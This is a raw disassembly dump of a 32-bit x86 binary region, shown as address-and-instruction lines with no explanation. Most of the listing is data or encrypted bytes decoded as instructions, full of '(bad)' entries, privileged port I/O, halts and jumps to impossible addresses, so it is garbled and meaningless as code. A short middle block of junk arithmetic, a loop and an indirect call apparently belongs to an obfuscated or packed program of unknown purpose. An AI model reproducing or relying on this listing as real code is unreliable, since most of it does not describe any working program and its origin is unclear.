  40da2d:	cmp    edx,DWORD PTR ds:0xd60b4ab9
  40da33:	mov    edx,0x8fd79a37
  40da38:	adc    al,0xb7
  40da3a:	cdq    
  40da3b:	adc    bl,BYTE PTR [ecx+0xd]
  40da3e:	out    dx,al
  40da3f:	push   0xffffff80
  40da41:	adc    dh,bh
  40da43:	mov    dl,0x7b
  40da45:	lods   al,BYTE PTR ds:[esi]
  40da46:	dec    edx
  40da48:	andps  xmm6,xmm3
  40da4b:	enter  0xe5e0,0x8f
  40da4f:	push   edx
  40da50:	push   0xd4ee56e9
  40da55:	mov    dl,BYTE PTR ss:[di-0x47]
  40da5a:	gs out dx,al
  40da5c:	hlt    
  40da5d:	xor    ecx,DWORD PTR [ebp+0x3f40fa14]
  40da63:	dec    esp
  40da64:	lea    esi,[edx+ecx*1-0x7c2d46de]
  40da6b:	rcr    DWORD PTR ds:0xa776ac70,0x67
  40da72:	aaa    
  40da73:	pop    ebp
  40da74:	jmp    0x44da40
  40da79:	cmp    eax,0x60c4097a
  40da7e:	push   edx
  40da7f:	ja     0x40da91
  40da81:	jmp    0xbc2c0da7
  40da86:	add    bl,BYTE PTR [esi+0x3d62bfa5]
  40da8c:	adc    BYTE PTR [edx-0x48],bh
  40da8f:	int    0x82
  40da91:	mov    ecx,0x655b84b4
  40da96:	mov    dl,BYTE PTR [eax+0x58aca5fa]
  40da9c:	out    0x59,al
  40da9e:	jo     0x40da7c
  40daa0:	outs   dx,DWORD PTR ds:[esi]
  40daa1:	sahf   
  40daa2:	jbe    0x40da9a
  40daa4:	aas    
  40daa5:	fimul  WORD PTR [eax+0x4ece7b06]
  40daab:	mov    BYTE PTR [eax+edi*4],ch
  40daae:	fld    DWORD PTR [ecx]
  40dab0:	and    al,BYTE PTR [esi]
  40dab2:	dec    ecx
  40dab3:	and    eax,0x26e085d5
  40dab8:	xchg   ebx,eax
  40dab9:	sbb    eax,DWORD PTR [esp+eax*4]
  40dabc:	repz (bad) 
  40dabe:	shr    BYTE PTR [eax-0x59],1
  40dac1:	mov    al,ds:0xa60e0262
  40dac6:	sar    DWORD PTR [ecx+0x5f9bea86],cl
  40dacc:	jmp    0x3c106ae5
  40dad1:	sub    esi,ebx
  40dad3:	xlat   BYTE PTR ds:[ebx]
  40dad4:	or     ebp,DWORD PTR [ebx+0x4d1b47c7]
  40dada:	sbb    ch,BYTE PTR [ecx-0x3c18e998]
  40dae0:	(bad)  
  40dae1:	js     0x40db01
  40dae3:	int    0x55
  40dae5:	add    BYTE PTR [edx-0x4fd27d0],0x37
  40daec:	adc    eax,0x78e60eb5
  40daf1:	mov    esp,0xed2c0c26
  40daf6:	push   es
  40daf7:	addr16 shl esp,0x15
  40dafb:	jecxz  0x40db02
  40dafd:	cmp    al,0x83
  40daff:	xor    bl,BYTE PTR [ebp-0x27]
  40db02:	mov    esi,0x6ed35f59
  40db07:	dec    ebx
  40db08:	lods   eax,DWORD PTR ds:[esi]
  40db09:	test   eax,0x6301a102
  40db0e:	sub    bh,bh
  40db10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db11:	cmp    ebp,edi
  40db13:	loope  0x40db76
  40db15:	nop
  40db16:	mov    esi,DWORD PTR [esi]
  40db18:	push   edi
  40db19:	shl    DWORD PTR [esi],cl
  40db1b:	xchg   esi,eax
  40db1c:	cmp    al,0xcf
  40db1e:	out    dx,eax
  40db1f:	mov    ch,0xc5
  40db21:	xor    bh,cl
  40db23:	jo     0x40db4d
  40db25:	xchg   BYTE PTR [edi],ch
  40db27:	mov    ch,BYTE PTR [edx-0x5c57dc51]
  40db2d:	(bad)  
  40db2e:	(bad)  
  40db2f:	sbb    eax,0xb608b56b
  40db34:	and    eax,0xa58ebc7b
  40db39:	xchg   edx,eax
  40db3a:	pusha  
  40db3b:	(bad)  
  40db3c:	mov    ds:0xd7ccb053,eax
  40db41:	hlt    
  40db42:	dec    eax
  40db43:	inc    edx
  40db44:	sbb    edx,DWORD PTR [esi]
  40db46:	les    eax,FWORD PTR [edi+0x38d9e6df]
  40db4c:	xchg   ecx,eax
  40db4d:	jmp    0x40dbb7
  40db4f:	adc    BYTE PTR [ebx+eax*1+0xd],ch
  40db53:	jg     0x40dadf
  40db55:	pushf  
  40db56:	loop   0x40daf9
  40db58:	push   edx
  40db59:	mov    edx,0x387bb23a
  40db5e:	out    0xf5,eax
  40db60:	fwait
  40db61:	mov    ecx,0x18f385bb
  40db66:	lods   al,BYTE PTR ds:[esi]
  40db67:	mov    WORD PTR [esi-0x5106d631],ds
  40db6d:	sahf   
  40db6e:	cmp    DWORD PTR [edi],ebx
  40db70:	ins    BYTE PTR es:[edi],dx
  40db71:	les    edx,FWORD PTR [eax-0x19]
  40db74:	mov    ds:0x60228f31,eax
  40db79:	lods   eax,DWORD PTR ds:[esi]
  40db7a:	in     al,0xc9
  40db7c:	out    0xcb,eax
  40db7e:	rcl    BYTE PTR [eax+0xe1dcd37],0x6c
  40db85:	xchg   DWORD PTR [edx+0x75],ecx
  40db88:	loop   0x40dbb0
  40db8a:	out    0x27,eax
  40db8c:	mov    esi,0xaf8a3513
  40db91:	mov    esi,0xb5254edd
  40db96:	ds push esi
  40db98:	and    BYTE PTR [ebx-0x22],bh
  40db9b:	pop    esp
  40db9c:	xchg   ebx,eax
  40db9d:	jmp    0xce6215ce
  40dba2:	mov    eax,ds:0xd2c7b6ce
  40dba7:	shr    BYTE PTR [edi+0x21],0xdf
  40dbab:	stos   BYTE PTR es:[edi],al
  40dbac:	sub    bl,BYTE PTR [edi]
  40dbae:	mov    bl,0x57
  40dbb0:	xchg   DWORD PTR [edi],esi
  40dbb2:	mov    al,0xd4
  40dbb4:	sti    
  40dbb5:	inc    esi
  40dbb6:	cmp    al,0x4d
  40dbb8:	daa    
  40dbb9:	or     cl,BYTE PTR [ebp+0x7e]
  40dbbc:	jle    0x40db3f
  40dbbe:	test   eax,0x98d5b370
  40dbc3:	mov    ah,0xd0
  40dbc5:	jle    0x40dbab
  40dbc7:	leave  
  40dbc8:	sub    dl,BYTE PTR [ebx-0x36]
  40dbcb:	test   eax,0xa521bf79
  40dbd0:	icebp  
  40dbd1:	dec    esi
  40dbd2:	loop   0x40dc00
  40dbd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dbd5:	div    BYTE PTR [ebx]
  40dbd7:	neg    bl
  40dbd9:	push   esp
  40dbda:	out    0x60,eax
  40dbdc:	push   ebp
  40dbdd:	dec    edi
  40dbde:	not    BYTE PTR [edx]
  40dbe0:	push   eax
  40dbe1:	add    bl,BYTE PTR [esi+edx*8-0x647068da]
  40dbe8:	pop    ds
  40dbe9:	pop    esi
  40dbea:	stc    
  40dbeb:	sbb    edx,esp
  40dbed:	lea    edi,[edx+eax*2-0x16d20fde]
  40dbf4:	add    eax,0x19ec0217
  40dbf9:	jnp    0x40dc70
  40dbfb:	rol    DWORD PTR [ebx],cl
  40dbfd:	(bad)  
  40dbfe:	repz sbb al,0x4f
  40dc01:	inc    esi
  40dc02:	outs   dx,DWORD PTR ds:[esi]
  40dc03:	push   eax
  40dc04:	das    
  40dc05:	test   dl,al
  40dc07:	lahf   
  40dc08:	or     cl,dh
  40dc0a:	retf   
  40dc0b:	jmp    0xa0bc3ad0
  40dc10:	mov    dh,0xf6
  40dc12:	test   edi,ebp
  40dc14:	push   edi
  40dc15:	in     al,dx
  40dc16:	jbe    0x40dbed
  40dc18:	xor    edi,DWORD PTR [eax+esi*2]
  40dc1b:	(bad)  
  40dc1c:	fnsave [edx-0x79]
  40dc1f:	push   es
  40dc20:	cmp    eax,0x24ef9436
  40dc25:	dec    edi
  40dc26:	mov    bl,0x17
  40dc28:	fcomp  DWORD PTR [ebx+0x35]
  40dc2b:	dec    edx
  40dc2c:	(bad)  
  40dc2d:	adc    al,0xf9
  40dc2f:	dec    esp
  40dc30:	inc    esi
  40dc31:	xor    edi,esp
  40dc33:	push   0xffffffce
  40dc35:	mov    dl,0x4
  40dc37:	or     cl,BYTE PTR [eax-0x29e150a6]
  40dc3d:	mov    dh,0xee
  40dc3f:	mov    bl,0x6e
  40dc41:	jns    0x40dcb3
  40dc43:	aam    0xcd
  40dc45:	sahf   
  40dc46:	data16 jae 0x40dcba
  40dc49:	daa    
  40dc4a:	outs   dx,DWORD PTR ds:[esi]
  40dc4b:	mov    dh,0xf8
  40dc4d:	aam    0x1b
  40dc4f:	jb     0x40dcbe
  40dc51:	pop    ebp
  40dc52:	xor    ecx,DWORD PTR [edx+0x1347d79f]
  40dc58:	cs fs sbb al,0xf9
  40dc5c:	data16 jge 0x40dc42
  40dc5f:	xchg   edx,eax
  40dc60:	sub    al,0xc7
  40dc62:	mov    bh,al
  40dc64:	das    
  40dc65:	inc    ecx
  40dc66:	or     cl,BYTE PTR [ebx]
  40dc68:	or     BYTE PTR [edx+0x36377491],bl
  40dc6e:	icebp  
  40dc6f:	shr    ebp,0xdd
  40dc72:	pop    edi
  40dc73:	adc    al,0xb9
  40dc75:	fild   WORD PTR [ecx+0x6aa73bcd]
  40dc7b:	mov    dh,0xb
  40dc7d:	and    eax,0xa3a0f75
  40dc82:	xchg   ecx,eax
  40dc83:	aam    0xfa
  40dc85:	aas    
  40dc86:	cmp    DWORD PTR [edi],ecx
  40dc88:	das    
  40dc89:	in     eax,0xf2
  40dc8b:	ret    0xf87
  40dc8e:	test   eax,0xf182e2d0
  40dc93:	mov    eax,0x4adae962
  40dc98:	js     0x40dcb0
  40dc9a:	sar    DWORD PTR [edi+0x1c],1
  40dc9d:	xchg   bl,al
  40dc9f:	inc    esi
  40dca0:	ins    BYTE PTR es:[edi],dx
  40dca1:	mov    cl,0xdc
  40dca3:	neg    DWORD PTR [esi-0x12]
  40dca6:	cwde   
  40dca7:	data16 sub ah,BYTE PTR [edi+ecx*1]
  40dcab:	xchg   ebx,eax
  40dcac:	xlat   BYTE PTR ds:[ebx]
  40dcad:	pop    ebp
  40dcae:	cs adc ecx,0xffffffe0
  40dcb2:	adc    ecx,DWORD PTR [ebp-0x2b7eb139]
  40dcb8:	call   0x5a6f6d97
  40dcbd:	pusha  
  40dcbe:	sbb    BYTE PTR [eax],0x65
  40dcc1:	loop   0x40dcfc
  40dcc3:	imul   ebp,ebx,0x488a400a
  40dcc9:	xlat   BYTE PTR ds:[ebx]
  40dcca:	int3   
  40dccb:	add    DWORD PTR [eax],esi
  40dccd:	in     al,dx
  40dcce:	sbb    eax,0x3a7d7f52
  40dcd3:	mov    eax,DWORD PTR [esi+ebx*1+0x28]
  40dcd7:	push   DWORD PTR [ebp-0x5c]
  40dcda:	test   eax,0xbc4ce596
  40dcdf:	jbe    0x40dc98
  40dce1:	xor    ecx,ebp
  40dce3:	or     DWORD PTR [edi+eiz*1],0x169dedda
  40dcea:	pusha  
  40dceb:	sbb    ebx,DWORD PTR [edx]
  40dced:	popf   
  40dcee:	aaa    
  40dcef:	sub    ah,bh
  40dcf1:	in     eax,0x9f
  40dcf3:	jg     0x40dd29
  40dcf5:	daa    
  40dcf6:	sti    
  40dcf7:	jmp    DWORD PTR ds:0xf747e7b1
  40dcfd:	fsubr  DWORD PTR [ebp+0x2d]
  40dd00:	lock pushf 
  40dd02:	mov    cl,0x4a
  40dd04:	(bad)  
  40dd05:	outs   dx,DWORD PTR ds:[esi]
  40dd06:	sahf   
  40dd07:	push   cs
  40dd08:	add    dl,BYTE PTR [edx]
  40dd0a:	repnz loopne 0x40dd04
  40dd0d:	dec    edi
  40dd0e:	xchg   esp,eax
  40dd0f:	jo     0x40dd1b
  40dd11:	mov    dl,0xcd
  40dd13:	aam    0x4
  40dd15:	add    BYTE PTR [ebp-0x18],cl
  40dd18:	mov    ch,0xb6
  40dd1a:	int3   
  40dd1b:	call   0xd656:0xf2a07625
  40dd22:	cmp    BYTE PTR [esi-0x50736784],0xd6
  40dd29:	sbb    eax,0xd52aba0e
  40dd2e:	pop    eax
  40dd2f:	mov    BYTE PTR [eax-0x5a226b35],0x9a
  40dd36:	(bad)  
  40dd37:	push   ss
  40dd38:	enter  0x2b6b,0x87
  40dd3c:	xor    esp,edi
  40dd3e:	rol    BYTE PTR [ebx-0x8dee1ac],0xb7
  40dd45:	mov    ds:0x9da53730,eax
  40dd4a:	lea    ebp,[eax]
  40dd4c:	or     dh,BYTE PTR [edi-0x5d128601]
  40dd52:	imul   esp
  40dd54:	add    BYTE PTR [eax+0x62e2328],dl
  40dd5a:	xchg   ebp,eax
  40dd5b:	push   ss
  40dd5c:	jo     0x40dda1
  40dd5e:	xor    DWORD PTR [esp+ecx*4+0x52482fef],0xffffffcd
  40dd66:	shr    BYTE PTR ds:[edx+0x0],0x95
  40dd6b:	or     ebp,eax
  40dd6d:	dec    eax
  40dd6e:	ret    
  40dd6f:	das    
  40dd70:	mov    edi,0xeb6f0d40
  40dd75:	xacquire xchg BYTE PTR [edx],dh
  40dd78:	xchg   DWORD PTR [ecx+0x4d],esi
  40dd7b:	jp     0x40dd4b
  40dd7d:	(bad)  
  40dd7e:	std    
  40dd7f:	das    
  40dd80:	cli    
  40dd81:	inc    ecx
  40dd82:	sbb    DWORD PTR [edi-0x16],ebp
  40dd85:	add    BYTE PTR [ecx],bh
  40dd87:	push   edx
  40dd88:	or     BYTE PTR ds:0x426eeb1e,0xfb
  40dd8f:	or     BYTE PTR [eax+0x681855ea],bl
  40dd95:	dec    ebx
  40dd96:	mov    eax,0xcf242cba
  40dd9b:	aam    0xcf
  40dd9d:	hlt    
  40dd9e:	(bad)  
  40dd9f:	stc    
  40dda0:	imul   esi,DWORD PTR [ebx+0x6ffedd12],0x69
  40dda7:	jns    0x40dd48
  40dda9:	mov    al,ds:0x4c569c85
  40ddae:	dec    edx
  40ddaf:	ss in  eax,dx
  40ddb1:	pop    edx
  40ddb2:	mov    al,ds:0xc15b0e18
  40ddb7:	stos   DWORD PTR es:[edi],eax
  40ddb8:	pop    ecx
  40ddb9:	ret    
  40ddba:	bound  ebx,QWORD PTR [edx+eax*1-0x54b1ccdd]
  40ddc1:	mov    ch,0xfe
  40ddc3:	add    ecx,DWORD PTR [ecx+ebp*8+0x6b]
  40ddc7:	(bad)  
  40ddc8:	adc    BYTE PTR [edx],dl
  40ddca:	push   eax
  40ddcb:	outs   dx,BYTE PTR ds:[esi]
  40ddcc:	dec    esp
  40ddcd:	int    0x70
  40ddcf:	aam    0xbe
  40ddd1:	dec    esi
  40ddd2:	inc    ebx
  40ddd3:	or     BYTE PTR [ebx+0x74],dl
  40ddd6:	pop    ecx
  40ddd7:	jnp    0x40ddfb
  40ddd9:	in     eax,dx
  40ddda:	pop    ss
  40dddb:	or     ecx,esi
  40dddd:	pushf  
  40ddde:	pop    ebp
  40dddf:	push   es
  40dde0:	(bad)  
  40dde1:	popf   
  40dde2:	cmc    
  40dde3:	xor    eax,0x10a4a800
  40dde8:	sub    al,0xb0
  40ddea:	cmp    al,0x63
  40ddec:	inc    ecx
  40dded:	sub    dh,BYTE PTR [esi+0x18]
  40ddf0:	popf   
  40ddf1:	fstp   TBYTE PTR [ebx]
  40ddf3:	mov    ds:0xdddac368,al
  40ddf8:	mov    esp,DWORD PTR [bp+si+0xa]
  40ddfc:	lahf   
  40ddfd:	adc    al,BYTE PTR ds:[edx-0x2b]
  40de01:	int    0x77
  40de03:	sti    
  40de04:	(bad)  
  40de05:	or     eax,eax
  40de07:	jnp    0x40ddce
  40de09:	or     esi,DWORD PTR [edi+0x316609e5]
  40de0f:	push   edi
  40de10:	pop    esp
  40de11:	(bad)  
  40de12:	stc    
  40de13:	or     dh,BYTE PTR [ecx]
  40de15:	rcl    BYTE PTR [esp+ecx*4],1
  40de18:	loope  0x40de73
  40de1a:	and    BYTE PTR [ecx-0x66],cl
  40de1d:	push   eax
  40de1e:	mov    ds:0x5e9532dd,eax
  40de23:	and    eax,0xe817315c
  40de28:	mov    esi,0x314ac45d
  40de2d:	iret   
  40de2e:	outs   dx,DWORD PTR ds:[esi]
  40de2f:	sbb    al,0xf
  40de31:	mov    edi,0x254c702f
  40de36:	sub    DWORD PTR ds:0x13849615,eax
  40de3c:	addr16 mov ah,0x6a
  40de3f:	adc    eax,0xd64c68e9
  40de44:	loop   0x40de38
  40de46:	or     al,0x99
  40de48:	js     0x40de9a
  40de4a:	(bad)  [esi-0x1acbc23c]
  40de50:	mov    eax,DWORD PTR [ebp-0x4]
  40de53:	push   ebx
  40de54:	mov    DWORD PTR ds:0x42500c,0x32d4
  40de5e:	je     0x40deb5
  40de64:	or     DWORD PTR ds:0x427000,ecx
  40de6a:	mov    esi,DWORD PTR [ebp-0x18]
  40de6d:	mov    DWORD PTR ds:0x429000,0x1a4f
  40de77:	add    DWORD PTR [eax],esi
  40de79:	mov    eax,DWORD PTR [ebp-0x4]
  40de7c:	xor    esi,esi
  40de7e:	or     esi,DWORD PTR ds:0x428010
  40de84:	or     DWORD PTR ds:0x42600c,esi
  40de8a:	mov    esi,DWORD PTR [ebp+0xc]
  40de8d:	dec    DWORD PTR ds:0x428014
  40de93:	xor    esi,ecx
  40de95:	add    esi,edx
  40de97:	sub    DWORD PTR ds:0x426014,0x425028
  40dea1:	imul   esi,DWORD PTR [eax]
  40dea4:	mov    DWORD PTR ds:0x42701c,0x7c46
  40deae:	mov    DWORD PTR [eax],esi
  40deb0:	jmp    0x40dec4
  40deb5:	sub    DWORD PTR ds:0x427010,0x59d5
  40debf:	mov    esi,DWORD PTR [ebp+0x14]
  40dec2:	xor    DWORD PTR [eax],esi
  40dec4:	sub    esi,edi
  40dec6:	mov    eax,DWORD PTR [ebp-0x4]
  40dec9:	and    DWORD PTR ds:0x42801c,0x11ac
  40ded3:	mov    edi,DWORD PTR [ebp+0x10]
  40ded6:	add    ebx,esi
  40ded8:	xor    edi,ecx
  40deda:	or     DWORD PTR ds:0x429010,ebx
  40dee0:	mov    esi,0xffcd8d25
  40dee5:	dec    DWORD PTR ds:0x42801c
  40deeb:	mov    ebx,esi
  40deed:	sub    ebx,edi
  40deef:	add    DWORD PTR [eax],ebx
  40def1:	mov    DWORD PTR ds:0x425020,0x1c
  40defb:	cmp    DWORD PTR ds:0x425020,0x0
  40df02:	je     0x40df56
  40df08:	cmp    DWORD PTR ds:0x425020,0x9
  40df0f:	jne    0x40df28
  40df15:	push   DWORD PTR [ebp-0x28]
  40df18:	push   0x8d04
  40df1d:	push   0x4e0d
  40df22:	call   DWORD PTR ds:0x421020
  40df28:	cmp    DWORD PTR ds:0x425020,0xa
  40df2f:	jne    0x40df42
  40df35:	mov    edi,DWORD PTR ds:0x425020
  40df3b:	dec    edi
  40df3c:	mov    DWORD PTR ds:0x425020,edi
  40df42:	xor    edi,edi
  40df44:	xor    edi,DWORD PTR ds:0x425020
  40df4a:	dec    edi
  40df4b:	mov    DWORD PTR ds:0x425020,edi
  40df51:	jmp    0x40defb
  40df56:	mov    eax,DWORD PTR [ebp-0x4]
  40df59:	mov    edi,DWORD PTR [ebp-0x8]
  40df5c:	add    edi,DWORD PTR [eax]
  40df5e:	mov    DWORD PTR [ebp-0x8],edi
  40df61:	mov    eax,DWORD PTR [ebp+0xc]
  40df64:	mov    edi,DWORD PTR [ebp+0xc]
  40df67:	xor    edi,ecx
  40df69:	xor    eax,ecx
  40df6b:	lea    eax,[eax+edi*1+0x64e5b6]
  40df72:	mov    edi,DWORD PTR [ebp+0xc]
  40df75:	xor    edi,ecx
  40df77:	add    edi,edx
  40df79:	imul   eax,edi
  40df7c:	mov    edi,DWORD PTR [ebp+0xc]
  40df7f:	xor    edi,ecx
  40df81:	sub    edi,eax
  40df83:	mov    eax,DWORD PTR [ebp-0x4]
  40df86:	add    edi,edx
  40df88:	cmp    DWORD PTR [eax],edi
  40df8a:	mov    eax,DWORD PTR [ebp-0x4]
  40df8d:	mov    edi,DWORD PTR [ebp+0x10]
  40df90:	jg     0x40dfa3
  40df96:	xor    edi,ecx
  40df98:	mov    ebx,esi
  40df9a:	sub    ebx,edi
  40df9c:	add    DWORD PTR [eax],ebx
  40df9e:	jmp    0x40dfa9
  40dfa3:	xor    edi,ecx
  40dfa5:	add    edi,edx
  40dfa7:	add    DWORD PTR [eax],edi
  40dfa9:	mov    eax,DWORD PTR [ebp-0x8]
  40dfac:	mov    edi,DWORD PTR [ebp-0x10]
  40dfaf:	mov    eax,DWORD PTR [eax]
  40dfb1:	xor    edi,ecx
  40dfb3:	add    edi,0x3272da
  40dfb9:	not    edi
  40dfbb:	and    eax,edi
  40dfbd:	movsx  di,BYTE PTR [eax+0x1]
  40dfc2:	jmp    0x41036d
  40dfc7:	jge    0x40e029
  40dfc9:	xor    al,0x4e
  40dfcb:	xor    eax,DWORD PTR [esi]
  40dfcd:	add    ecx,DWORD PTR [edi-0x5e]
  40dfd0:	mov    dl,0x21
  40dfd2:	mov    al,0xf2
  40dfd4:	jns    0x40e02b
  40dfd6:	xor    ebp,eax
  40dfd8:	shl    BYTE PTR [edx+0x62],cl
  40dfdb:	hlt    
  40dfdc:	pop    edi
  40dfdd:	bound  esp,QWORD PTR [edx+0x4b]
  40dfe0:	fisubr WORD PTR [eax+edx*1+0x1c785940]
  40dfe7:	push   cs
  40dfe8:	shl    DWORD PTR [eax+0x241c9e5e],cl
  40dfee:	mov    ah,ch
  40dff0:	loopne 0x40dff8
  40dff2:	push   ebx
  40dff3:	fcom   DWORD PTR [eax]
  40dff5:	xor    bl,bh
  40dff7:	(bad)  
  40dff8:	adc    al,0xb6
  40dffa:	dec    ebp
  40dffb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dffc:	xchg   BYTE PTR [eax],bl
  40dffe:	push   edi
  40dfff:	jnp    0x40e080
  40e001:	xchg   BYTE PTR [edx+edi*4-0x220bbc0c],dl
  40e008:	xchg   dh,dl
  40e00a:	push   cs
  40e00b:	iret   
  40e00c:	test   esi,ecx
  40e00e:	push   es
  40e00f:	sar    DWORD PTR [ebx+eax*8-0x3e1f7cd0],cl
  40e016:	or     al,0x69
  40e018:	pushf  
  40e019:	fwait
  40e01a:	mov    dl,0x58
  40e01c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e01d:	pop    ds
  40e01e:	mov    bh,0xe7
  40e020:	fadd   QWORD PTR [ecx+edi*8+0x11]
  40e024:	(bad)  
  40e025:	out    dx,al
  40e026:	imul   ecx,DWORD PTR [edx-0x7f187e31],0xffffffbb
  40e02d:	ds loope 0x40e042
  40e030:	jns    0x40e000
  40e032:	cdq    
  40e033:	lea    edi,[edi+0x19]
  40e036:	or     bh,BYTE PTR [eax-0x3e]
  40e039:	test   eax,0x3ec68d93
  40e03e:	outs   dx,BYTE PTR ds:[esi]
  40e03f:	jae    0x40dfc2
  40e041:	jg     0x40e0b2
  40e043:	nop
  40e044:	xchg   esp,eax
  40e045:	int    0xba
  40e047:	mov    edi,0xcc13f17e
  40e04c:	arpl   WORD PTR [eax+0x28],di
  40e04f:	nop
  40e050:	or     dh,BYTE PTR [ecx-0x1e]
  40e053:	jecxz  0x40e06c
  40e055:	(bad)  
  40e056:	sti    
  40e057:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e058:	mov    esi,0x74e0826f
  40e05d:	and    eax,0xd028883b
  40e062:	pop    ebp
  40e063:	sub    al,0x27
  40e065:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e066:	mov    bh,0xd8
  40e068:	fs or  dl,cl
  40e06b:	data16 jg 0x40e039
  40e06e:	push   es
  40e06f:	dec    esp
  40e070:	out    dx,al
  40e071:	push   esp
  40e072:	ror    ecx,1
  40e074:	mov    dl,0xd3
  40e076:	cvtdq2ps xmm6,XMMWORD PTR [eax+0x61]
  40e07a:	mov    ah,0x65
  40e07c:	push   esi
  40e07d:	or     bl,BYTE PTR [edi+0x28]
  40e080:	adc    esi,DWORD PTR [esi-0x3b]
  40e083:	dec    ebx
  40e084:	xchg   edi,eax
  40e085:	imul   DWORD PTR [edi]
  40e087:	test   eax,0x411f600f
  40e08c:	inc    ecx
  40e08d:	xor    al,BYTE PTR [ebp+0x73b98bb4]
  40e093:	mov    edx,0xe7d76cee
  40e098:	dec    edx
  40e099:	loopne 0x40e0bb
  40e09b:	ss mov edi,0x356735d9
  40e0a1:	les    esp,FWORD PTR [ebx+0x39]
  40e0a4:	xchg   esi,eax
  40e0a5:	mov    dl,0x4c
  40e0a7:	ins    DWORD PTR es:[edi],dx
  40e0a8:	dec    esp
  40e0a9:	inc    edi
  40e0aa:	cmp    ah,bh
  40e0ac:	mov    esi,0xf83fb8a
  40e0b1:	in     eax,0xc
  40e0b3:	sahf   
  40e0b4:	ins    BYTE PTR es:[edi],dx
  40e0b5:	dec    edx
  40e0b6:	adc    ecx,DWORD PTR ds:0x5086f8b9
  40e0bc:	sbb    eax,0x1c9e2202
  40e0c1:	and    eax,0x5be281a9
  40e0c6:	mov    cl,0xd5
  40e0c8:	dec    ecx
  40e0c9:	out    0x4b,al
  40e0cb:	and    eax,0xfaa552fb
  40e0d0:	xor    eax,DWORD PTR [ecx+0x2943df1a]
  40e0d6:	hlt    
  40e0d7:	jl     0x40e0b8
  40e0d9:	and    esi,DWORD PTR [ecx+0x552a7d69]
  40e0df:	and    edx,DWORD PTR [edi+ecx*8-0x7f6df1ee]
  40e0e6:	mov    edx,0x4991037d
  40e0eb:	adc    cl,al
  40e0ed:	enter  0x4dd1,0xa9
  40e0f1:	retf   
  40e0f2:	cmp    edi,DWORD PTR [edi+0x7f]
  40e0f5:	dec    edx
  40e0f6:	jb     0x40e11e
  40e0f8:	ins    BYTE PTR es:[edi],dx
  40e0f9:	repnz lds edx,FWORD PTR [eax-0x7e]
  40e0fd:	maskmovq mm1,mm3
  40e100:	lea    ecx,[ecx+0x6d9f9bd6]
  40e106:	imul   ebx,DWORD PTR [ebx+ecx*2],0x2e68be39
  40e10d:	retf   
  40e10e:	lock movs BYTE PTR es:[edi],BYTE PTR fs:[esi]
  40e111:	les    ebp,FWORD PTR [ebx-0x24f69539]
  40e117:	ins    DWORD PTR es:[edi],dx
  40e118:	ja     0x40e0ea
  40e11a:	dec    eax
  40e11b:	pop    ebx
  40e11c:	adc    eax,ecx
  40e11e:	lds    eax,FWORD PTR [esi]
  40e120:	inc    ebp
  40e121:	hlt    
  40e122:	pop    edx
  40e123:	lds    eax,FWORD PTR [eax]
  40e125:	add    al,0x2c
  40e127:	in     al,dx
  40e128:	and    bh,bh
  40e12a:	ret    
  40e12b:	into   
  40e12c:	cmp    bl,ah
  40e12e:	and    al,0x26
  40e130:	pop    esp
  40e131:	sti    
  40e132:	inc    ecx
  40e133:	not    DWORD PTR [ebx]
  40e135:	loopne 0x40e150
  40e137:	pop    edx
  40e138:	mov    bh,0xc
  40e13a:	push   ebp
  40e13b:	mov    dh,0x79
  40e13d:	(bad)  
  40e13e:	repnz push ds
  40e140:	xchg   DWORD PTR [edx-0x42],ebp
  40e143:	cmp    ch,BYTE PTR [ebp-0x5cc1826b]
  40e149:	mov    bh,0x8c
  40e14b:	pop    ebp
  40e14c:	cld    
  40e14d:	btc    DWORD PTR [ebx-0x289d8a32],eax
  40e154:	rcl    BYTE PTR ds:0xc87c3701,0xba
  40e15b:	out    0x43,al
  40e15d:	loope  0x40e16d
  40e15f:	jno    0x40e1dd
  40e161:	pop    ecx
  40e162:	js     0x40e1c4
  40e164:	jl     0x40e0f7
  40e166:	xchg   ecx,eax
  40e167:	std    
  40e168:	push   0xffffff8d
  40e16a:	aas    
  40e16b:	mov    edi,0x145b1c64
  40e170:	xchg   ebx,eax
  40e171:	cmp    DWORD PTR [ebp+esi*4+0x54],ebp
  40e175:	push   edi
  40e176:	(bad)  
  40e177:	jecxz  0x40e15b
  40e179:	mov    ds:0x5096bdfc,al
  40e17e:	mov    ah,0xd0
  40e180:	call   0xa153:0x14ded2b3
  40e187:	cs push ecx
  40e189:	xlat   BYTE PTR ds:[ebx]
  40e18a:	cli    
  40e18b:	and    al,0x54
  40e18d:	push   ds
  40e18e:	mov    edx,0x125b6080
  40e193:	add    esp,0x4d
  40e196:	and    DWORD PTR [esi+ebx*2],esi
  40e199:	aaa    
  40e19a:	inc    edi
  40e19b:	into   
  40e19c:	pop    es
  40e19d:	into   
  40e19e:	mov    ah,0x20
  40e1a0:	fldcw  WORD PTR [ecx+0x41592daa]
  40e1a6:	jne    0x40e1c7
  40e1a8:	pop    ecx
  40e1a9:	loopne 0x40e14a
  40e1ab:	inc    esi
  40e1ac:	js     0x40e1cc
  40e1ae:	daa    
  40e1af:	repz jo 0x40e1e8
  40e1b2:	mov    dl,0x9d
  40e1b5:	ss popf 
  40e1b7:	mov    cl,0x7c
  40e1b9:	in     eax,0x32
  40e1bb:	ret    
  40e1bc:	mov    dl,0xc1
  40e1be:	iret   
  40e1bf:	in     eax,0xab
  40e1c1:	and    eax,0x56f09a3e
  40e1c6:	enter  0x155e,0xfb
  40e1ca:	ficomp WORD PTR [edx+0x2d]
  40e1cd:	adc    ebp,DWORD PTR [ebx+0x676c5b17]
  40e1d3:	sub    BYTE PTR [ebx],ch
  40e1d5:	xchg   esp,eax
  40e1d6:	js     0x40e19c
  40e1d8:	outs   dx,DWORD PTR ds:[esi]
  40e1d9:	scas   eax,DWORD PTR es:[edi]
  40e1da:	sub    eax,0xd01f3c38
  40e1df:	in     al,dx
  40e1e0:	jmp    0x910f:0x8188d0ba
  40e1e7:	in     al,dx
  40e1e8:	scas   al,BYTE PTR es:[edi]
  40e1e9:	fwait
  40e1ea:	push   es
  40e1eb:	mov    ecx,0x7b69f285
  40e1f0:	in     al,0xc7
  40e1f2:	mov    dl,0x7a
  40e1f4:	xchg   esi,eax
  40e1f5:	mov    ss,WORD PTR [esi-0x189d70c3]
  40e1fb:	mov    al,ds:0xd5e7d75c
  40e200:	pop    ss
